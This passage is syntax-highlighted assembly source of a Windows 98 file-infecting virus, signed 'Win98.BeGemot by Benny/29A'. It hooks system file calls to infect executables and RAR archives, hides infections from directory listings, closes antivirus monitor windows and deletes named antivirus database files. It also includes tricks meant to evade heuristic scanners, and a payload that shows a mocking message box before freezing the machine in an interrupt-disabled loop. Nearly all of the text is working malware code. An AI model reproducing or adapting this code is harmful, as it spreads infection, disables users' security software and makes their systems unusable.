        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">KiLlMoNs</span><span class="sc0">                           </span><span class="sc1">;kill another one</span><span class="sc0">

</span><span class="sc5">quit_payload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                 </span><span class="sc1">;now we will use FAR return</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a1h</span><span class="sc0">                            </span><span class="sc1">;trick to fool some stupid</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">400002h.MZ_res2</span><span class="sc0">                      </span><span class="sc1">;heuristic scanners. Heh, who</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">400000h</span><span class="sc0">                       </span><span class="sc1">;could expect someone will</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;FAR return in flat model, heh</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                                    </span><span class="sc1">;jump to host</span><span class="sc0">

</span><span class="sc5">do_payload</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;time for our payload</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                              </span><span class="sc1">;system modal window</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">szTitle</span><span class="sc0">                            </span><span class="sc1">;title of window</span><span class="sc0">
</span><span class="sc5">sztt</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Virus Win98.BeGemot by Benny/29A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ShItTyMoNs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Amon Antivirus Monitor'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">szTitle</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">szText</span><span class="sc0">                             </span><span class="sc1">;text of window</span><span class="sc0">
</span><span class="sc5">sztx</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Wait a minute,'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Micro$h!t is everywhere u want to be...'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Please call Micro$h!t on-line help, if u have any problems.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Don''t u have a telephone? So call your system supervisor.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'R u supervisor? So call Micro$h!t on-line help...'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Ehrm, well... where do u want to go y3st3rday?'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PS: Your problem ain''t virus. Micro$h!t didn''t certified'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'this hardware, buy a new one...'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Press OK button to solve this problem by Micro$h!t...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MsgBxA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0bff5412eh</span><span class="sc0">
</span><span class="sc5">FndWndA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0bff5590ch</span><span class="sc0">
</span><span class="sc5">PstMsgA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0bff556fch</span><span class="sc0">

</span><span class="sc5">szText</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;HWnd=0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MsgBxA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;display message box</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;fuck all preemptives</span><span class="sc0">
</span><span class="sc5">FuckThemAll</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FuckThemAll</span><span class="sc0">                         </span><span class="sc1">;infinite loop. System wont</span><span class="sc0">
                                                </span><span class="sc1">;switch to another process ;)</span><span class="sc0">
</span><span class="sc5">write_something</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;WriteToFile procedure</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                             </span><span class="sc1">;Write to file service</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                              </span><span class="sc1">;call int21h</span><span class="sc0">

</span><span class="sc5">read_something</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;ReadFromFile procedure</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;to header variable</span><span class="sc0">
</span><span class="sc5">r_something</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;ReadFromFile procedure2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">                             </span><span class="sc1">;service number</span><span class="sc0">
</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;push parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">002a0010h</span><span class="sc0">                          </span><span class="sc1">;service number to VMM</span><span class="sc0">
</span><span class="sc5">ipatch</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">                               </span><span class="sc1">;call int21h</span><span class="sc0">

</span><span class="sc5">rint21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;resident version of int21h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;runtime version of int21h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc1">;AV filez born to be deleted</span><span class="sc0">
</span><span class="sc5">ShItTyFiLeZ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DRWEBASE.VDB'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;ByE-kAsPeRsKy</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NOD32.000'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;ByE-tRnKa</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVG.AVI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;ByE-oDeHnAl</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;ByE-tBaV</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP.CRC'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;ByE-aVp</span><span class="sc0">

</span><span class="sc5">RARHeader</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;No comment ;)</span><span class="sc0">
</span><span class="sc5">RARHeaderCRC</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARType</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">74h</span><span class="sc0">
</span><span class="sc5">RARFlags</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc5">RARHSize</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARHeader</span><span class="sc0">
</span><span class="sc5">RARCompressed</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">3000h</span><span class="sc0">
</span><span class="sc5">RAROriginal</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">3000h</span><span class="sc0">
</span><span class="sc5">RAROS</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARCRC32</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARFileDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">RARNeedVer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">RARMethod</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">RARFNameSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARName</span><span class="sc0">
</span><span class="sc5">RARAttrib</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'BEER.EXE'</span><span class="sc0">
</span><span class="sc5">end_RAR</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">last_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ah</span><span class="sc0">                             </span><span class="sc1">;Get system time?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">                      </span><span class="sc1">;no, back to original handler</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!BG!'</span><span class="sc0">                         </span><span class="sc1">;our sign?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">                      </span><span class="sc1">;no, back to orig. handler</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1982</span><span class="sc0">                           </span><span class="sc1">;mark this</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">farjmp</span><span class="sc0">                              </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">VxDCall_hook</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">                </span><span class="sc1">;VXDCall hooker starts here</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc0">                </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">mgdelta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;ECX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;CL=semaphore</span><span class="sc0">
</span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">quit_hook</span><span class="sc0">                         </span><span class="sc1">;we wont trace our calls</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002a0010h</span><span class="sc0">                      </span><span class="sc1">;int21h dispatch service?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">quit_hook</span><span class="sc0">                           </span><span class="sc1">;no, quit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;get service number</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3dh</span><span class="sc0">             </span><span class="sc1">;Open file ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">             </span><span class="sc1">;Get/Set attributes</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6c00h</span><span class="sc0">               </span><span class="sc1">;Extended Create/Open</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infct2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">             </span><span class="sc1">;any LFN service ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">last_test</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">             </span><span class="sc1">;Extended Get/Set attributes ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4eh</span><span class="sc0">             </span><span class="sc1">;LFN find first file</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4fh</span><span class="sc0">             </span><span class="sc1">;LFN find next file</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc0">             </span><span class="sc1">;LFN rename file</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6ch</span><span class="sc0">             </span><span class="sc1">;LFN extended open</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infct2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a8h</span><span class="sc0">                </span><span class="sc1">;LFN short name</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infct2</span><span class="sc0">

</span><span class="sc5">exit_infection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;set semaphore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_state</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">BG_IDLE</span><span class="sc0">    </span><span class="sc1">;set virus state</span><span class="sc0">
</span><span class="sc5">quit_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                              </span><span class="sc1">;restore all regs</span><span class="sc0">
</span><span class="sc5">farjmp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;and jump to</span><span class="sc0">
</span><span class="sc5">jump_loc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                 </span><span class="sc1">;previous handler</span><span class="sc0">

</span><span class="sc5">s_int21h</span><span class="sc4">:</span><span class="sc0">                                                  </span><span class="sc1">;int21h for stealth</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                           </span><span class="sc1">;function</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">002a0010h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">stealth</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;stealthin function starts here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_state</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">BG_STEALTHIN</span><span class="sc0"> </span><span class="sc1">;set virus state</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;now we will call property</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">s_ret</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;function and get result           </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">api_ret</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;set return address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">find_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;save ptr to WIN32FINDDATA</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_hook</span><span class="sc0">                           </span><span class="sc1">;and call prev. handler</span><span class="sc0">

</span><span class="sc5">api_ret</span><span class="sc4">:</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">b2caller</span><span class="sc0">                             </span><span class="sc1">;return and get results</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;get delta offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc0">
</span><span class="sc5">sgdelta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;get WIN32FINDDATA</span><span class="sc0">
</span><span class="sc5">find_data</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">c_name</span><span class="sc0">                             </span><span class="sc1">;check filename</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">quit_stealth</span><span class="sc0">                         </span><span class="sc1">;error, quit stealth</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;set semaphore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">716ch</span><span class="sc0">                          </span><span class="sc1">;Extended Open/Create file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;attributes</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;action</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_int21h</span><span class="sc0">                           </span><span class="sc1">;call it</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">quit_stealth</span><span class="sc0">                         </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">                             </span><span class="sc1">;read DOS MZ header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_int21h</span><span class="sc0">                           </span><span class="sc1">;...</span><span class="sc0">
